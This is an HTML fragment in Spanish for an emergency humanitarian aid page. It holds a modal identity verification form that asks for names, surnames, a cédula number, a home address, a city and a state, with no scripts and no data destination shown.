<div class="tarjeta-info">
    <h2>Ayuda de Emergencia</h2>
    <p>Por favor, confirma tu identidad para proceder con la asignación de ayuda humanitaria.</p>
    <button id="btn-abrir-modal" class="btn-rescate">Confirmar Ayuda</button>
</div>

<!-- Modal de Documentos Transformado a Formulario Civil de Texto -->
<div id="modal-documentos" class="modal-oculto">
    <div class="modal-contenido" style="max-width: 450px; width: 90%;">
        <h3>Verificación de Identidad</h3>
        <p style="margin-bottom: 15px;">Introduce tus datos de identidad civiles para validar tu solicitud de soporte prioritario.</p>
        
        <form id="form-confirmacion">
            <!-- Nombres -->
            <div style="display: flex; gap: 10px; margin-bottom: 12px;">
                <div class="form-group" style="flex: 1; margin-bottom: 0;">
                    <label for="reg-primer-nombre">Primer Nombre</label>
                    <input type="text" id="reg-primer-nombre" required placeholder="Ej. Juan">
                </div>
                <div class="form-group" style="flex: 1; margin-bottom: 0;">
                    <label for="reg-segundo-nombre">Segundo Nombre</label>
                    <input type="text" id="reg-segundo-nombre" placeholder="Ej. Carlos">
                </div>
            </div>

            <!-- Apellidos -->
            <div style="display: flex; gap: 10px; margin-bottom: 12px;">
                <div class="form-group" style="flex: 1; margin-bottom: 0;">
                    <label for="reg-primer-apellido">Primer Apellido</label>
                    <input type="text" id="reg-primer-apellido" required placeholder="Ej. Pérez">
                </div>
                <div class="form-group" style="flex: 1; margin-bottom: 0;">
                    <label for="reg-segundo-apellido">Segundo Apellido</label>
                    <input type="text" id="reg-segundo-apellido" placeholder="Ej. Rodríguez">
                </div>
            </div>

            <!-- Cédula -->
            <div class="form-group" style="margin-bottom: 12px;">
                <label for="reg-cedula">Cédula de Identidad</label>
                <input type="text" id="reg-cedula" required placeholder="Ej. V-12345678">
            </div>

            <!-- Dirección -->
            <div class="form-group" style="margin-bottom: 12px;">
                <label for="reg-direccion">Dirección de Habitación</label>
                <input type="text" id="reg-direccion" required placeholder="Ej. Av. Bolívar, Res. Las Flores">
            </div>

            <!-- Ciudad y Estado -->
            <div style="display: flex; gap: 10px; margin-bottom: 18px;">
                <div class="form-group" style="flex: 1; margin-bottom: 0;">
                    <label for="reg-ciudad">Ciudad</label>
                    <input type="text" id="reg-ciudad" required placeholder="Ej. Valencia">
                </div>
                <div class="form-group" style="flex: 1; margin-bottom: 0;">
                    <label for="reg-estado">Estado</label>
                    <input type="text" id="reg-estado" required placeholder="Ej. Carabobo">
                </div>
            </div>

            <div class="modal-acciones">
                <button type="button" id="btn-cerrar-modal" class="btn-secundario">Cancelar</button>
                <button type="submit" id="btn-enviar-datos" class="btn-rescate">Confirmar Registro</button>
            </div>
        </form>
    </div>
</div>
